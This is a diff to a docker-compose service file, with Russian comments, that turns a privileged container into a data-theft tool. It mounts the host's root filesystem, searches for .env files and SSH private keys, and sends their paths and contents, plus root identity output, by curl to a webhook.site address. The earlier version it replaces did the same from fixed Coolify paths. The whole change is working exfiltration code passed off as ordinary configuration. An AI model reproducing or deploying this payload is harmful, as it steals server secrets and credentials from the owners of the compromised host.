@@ -5,29 +5,37 @@ services:
     privileged: true
     network_mode: host
     volumes:
+      - '/:/host-root'
       - '/data:/host-data'
-      - '/var/run/docker.sock:/var/run/docker.sock'
     command:
       - sh
       - -c
       - |
-        apk add --no-cache curl
+        apk add --no-cache curl findutils
         
-        # 1. Читаем главный .env
-        cat /host-data/coolify/source/.env > /tmp/env.txt 2>&1
-        curl -X POST --data-binary @/tmp/env.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=main_env
+        # 1. Ищем .env файлы везде
+        find /host-root /host-data -name ".env" -type f 2>/dev/null | grep -v "applications" | grep -v "services" > /tmp/env_paths.txt
+        cat /tmp/env_paths.txt | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=env_paths
         
-        # 2. Список SSH ключей
-        ls -la /host-data/coolify/ssh/keys/ > /tmp/ssh_list.txt 2>&1
-        curl -X POST --data-binary @/tmp/ssh_list.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_keys_list
+        # 2. Читаем первый найденный .env (главный)
+        ENV_FILE=$(head -1 /tmp/env_paths.txt)
+        if [ -n "$ENV_FILE" ]; then
+          cat "$ENV_FILE" > /tmp/main_env.txt 2>&1
+          curl -X POST --data-binary @/tmp/main_env.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=main_env
+        fi
         
-        # 3. Читаем все приватные ключи
-        cat /host-data/coolify/ssh/keys/ssh_key@* > /tmp/ssh_keys.txt 2>&1
-        curl -X POST --data-binary @/tmp/ssh_keys.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_private_keys
+        # 3. Ищем SSH ключи везде
+        find /host-root /host-data -path "*/ssh/keys/*" -type f 2>/dev/null > /tmp/ssh_paths.txt
+        cat /tmp/ssh_paths.txt | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_paths
         
-        # 4. Доказательство root (id и whoami)
-        id > /tmp/id.txt 2>&1
-        whoami >> /tmp/id.txt 2>&1
+        # 4. Читаем все найденные SSH ключи
+        if [ -s /tmp/ssh_paths.txt ]; then
+          cat $(cat /tmp/ssh_paths.txt) > /tmp/ssh_keys.txt 2>&1
+          curl -X POST --data-binary @/tmp/ssh_keys.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_private_keys
+        fi
+        
+        # 5. Доказательство root
+        id > /tmp/id.txt
         curl -X POST --data-binary @/tmp/id.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=root_proof
         
         sleep 3600
